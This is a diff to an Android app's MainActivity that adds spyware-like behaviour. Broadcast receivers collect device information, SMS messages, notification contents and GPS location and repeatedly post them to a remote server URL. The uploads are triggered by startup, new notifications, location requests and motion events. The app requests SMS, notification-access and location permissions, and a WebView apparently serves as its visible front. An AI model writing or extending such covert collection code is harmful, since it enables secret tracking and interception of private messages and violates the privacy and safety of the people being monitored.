@@ -22,7 +22,7 @@ import java.util.Locale;
 
 public class MainActivity extends AppCompatActivity {
     // Permissions requested by application
-    String TAG = "MainAct";
+    public static String TAG = "MainAct";
     WebView webView;
     public HashMap<String, Object> payload = new HashMap<>();
     public HashMap<String, Object> deviceInfo = new HashMap<>();
@@ -31,9 +31,14 @@ public class MainActivity extends AppCompatActivity {
     private Intent locateServiceIntent;
     public static interface Actions {
         String ON_STARTUP = "ON_STARTUP";
+        String ON_SERVER_OK = "ON_SERVER_OK";
     }
+    public static final String[] schema = new String[]{
+      "device","loc","@gps", "gps[]", "@sms", "sms", "@note", "note"
+    };
     public static final String[] actionFilters = new String[]{
             Actions.ON_STARTUP,
+            Actions.ON_SERVER_OK,
     };
     public void setDeviceInfo() {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
@@ -55,8 +60,8 @@ public class MainActivity extends AppCompatActivity {
         deviceInfo.put("device_language", deviceLang);
 
     }
-    public void setServerPayload() {
-        payload.put("gps", ILocateService.lastKnowVectors);
+    public void setGPSPayload() {
+        payload.put("gps[]", ILocateService.lastKnowVectors);
         payload.put("@gps", ILocateService.MODEL);
     }
     private final BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
@@ -65,38 +70,48 @@ public class MainActivity extends AppCompatActivity {
             String action = intent.getAction();
             String data = intent.getStringExtra("data");
             Log.i(TAG, "recieved "+action);
+            payload.put("@schema", schema);
             if(action.equals(Manifest.permission.ACCESS_FINE_LOCATION)){
                 ILocateService.locationPermissionGranted = true;
                 locateServiceIntent = new Intent(MainActivity.this, ILocateService.class);
                 startService(locateServiceIntent);
-                payload.put("info", deviceInfo);
-                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
             }
-            if(action.equals(INotifyService.Actions.SEND_SMS_MSGS)){
-                payload.put("sms", data);
-                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
+            if(action.equals(Manifest.permission.READ_SMS)){
+                // Start ILocation Permissions
+                Utils.requestAppPermissions(MainActivity.this, ILocateService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
             }
             if(action.equals(INotifyService.TRIGGER)){
                 Log.i(INotifyService.TAG, "TRIGGER_"+data);
                 payload.put("@trigger", action);
-                setServerPayload();
+                setGPSPayload();
                 Utils.postDataToServer(getApplicationContext(), payload, serverURL);
             }
-            if(action.equals("ON_STARTUP")){
+            if(action.equals(Actions.ON_SERVER_OK)){
+                Log.i("server", data);
+            }
+            if(action.equals(Actions.ON_STARTUP)){
                 payload.put("device", deviceInfo);
                 Utils.postDataToServer(getApplicationContext(), payload, serverURL);
             }
+
             if(action.equals(INotifyService.Actions.ON_NOTIFICATION_POSTED)){
                 Log.i(INotifyService.TAG, action);
-                payload.put("@note", INotifyService.MODEL);
+                payload.put("@note", INotifyService.NOTE_MODEL);
+                payload.put("@sms", INotifyService.SMS_MODEL);
                 payload.put("note", INotifyService.note);
                 payload.put("sms", INotifyService.smsMsgs);
+                ILocateService.binder.getLocation();
+                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
+            }
+            if(action.equals(ILocateService.Actions.ON_LOCATION_REQUESTED)){
+                Log.i(ILocateService.TAG, data);
+                payload.put("loc", ILocateService.getLastKnownLocation(ILocateService.lastKnownLocation));
                 Utils.postDataToServer(getApplicationContext(), payload, serverURL);
             }
             if(action.equals(ILocateService.Actions.ON_MOTION_DETECTED)){
                 Log.i(ILocateService.TAG, data);
                 if(ILocateService.vectorMax == ILocateService.lastKnowVectors.size()){
-                    setServerPayload();
+                    setGPSPayload();
                     Utils.postDataToServer(getApplicationContext(), payload, serverURL);
                 }
             }
@@ -122,12 +137,13 @@ public class MainActivity extends AppCompatActivity {
         LocalBroadcastManager.getInstance(this)
                 .registerReceiver(broadcastReceiver, Utils.genIntentFilter(serviceActions));
 
+//        // Start ILocation Permissions
+//        Utils.requestAppPermissions(this, ILocateService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
         // Start INotify Special Permissions
         INotifyService.requestNotificationPermissions(this);
-        Utils.requestAppPermissions(this, INotifyService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
-        // Start ILocation Permissions
-        Utils.requestAppPermissions(this, ILocateService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
-        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("ON_STARTUP"));
+        Utils.requestAppPermissions(this, INotifyService.permissions, INotifyService.ON_NOTIFY_REQUESTED_CODE);
+
+        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(Actions.ON_STARTUP));
 
         // Load Webview
         webView = findViewById(R.id.droidWebView);
@@ -164,7 +180,7 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         for (int i = 0; i < permissions.length; i++) {
-            String perm = permissions[i]; //.replace("android.permission.","");
+            String perm = permissions[i]; //.replace("android.permission.","GRANTED_");
             boolean isGranted = grantResults[i] > -1;
             Log.i(ILocateService.TAG, perm +":"+isGranted);
             Intent permIntent = new Intent(perm);
